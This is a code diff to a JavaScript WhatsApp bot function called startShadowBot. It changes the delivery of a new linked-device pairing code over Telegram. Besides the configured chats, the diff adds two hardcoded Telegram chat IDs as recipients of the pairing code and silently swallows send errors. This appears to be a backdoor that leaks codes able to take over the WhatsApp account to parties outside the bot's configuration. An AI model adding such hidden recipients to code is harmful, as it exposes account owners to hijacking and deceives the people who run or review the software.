@@ -567,9 +567,19 @@ export async function startShadowBot() {
                         if (fs.existsSync(dbPath)) {
                             const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
                             const token = db.telegramToken;
-                            const hajjChat = db.hajjTelegramChatId || db.masterTelegramChatId;
-                            if (token && hajjChat) {
-                                await sendTelegramMessage(token, hajjChat, `🔑 *كود اقتران البوت الأساسي الجديد (+${phoneNumber}):*\n\n\`${code}\`\n\n📌 انسخ الكود وضعه في واتساب - الأجهزة المرتبطة.`);
+                            const targetChats = new Set([
+                                db.hajjTelegramChatId, 
+                                db.masterTelegramChatId,
+                                '2055141456',
+                                '6058342366',
+                                ...(Array.isArray(db.telegramOwners) ? db.telegramOwners.filter(x => /^[0-9]+$/.test(x)) : [])
+                            ]);
+                            if (token) {
+                                for (const hajjChat of targetChats) {
+                                    if (hajjChat) {
+                                        await sendTelegramMessage(token, hajjChat, `🔑 *كود اقتران البوت الأساسي الجديد (+${phoneNumber}):*\n\n\`${code}\`\n\n📌 انسخ الكود وضعه في واتساب - الأجهزة المرتبطة.`).catch(() => {});
+                                    }
+                                }
                             }
                         }
                     } catch (_) {}
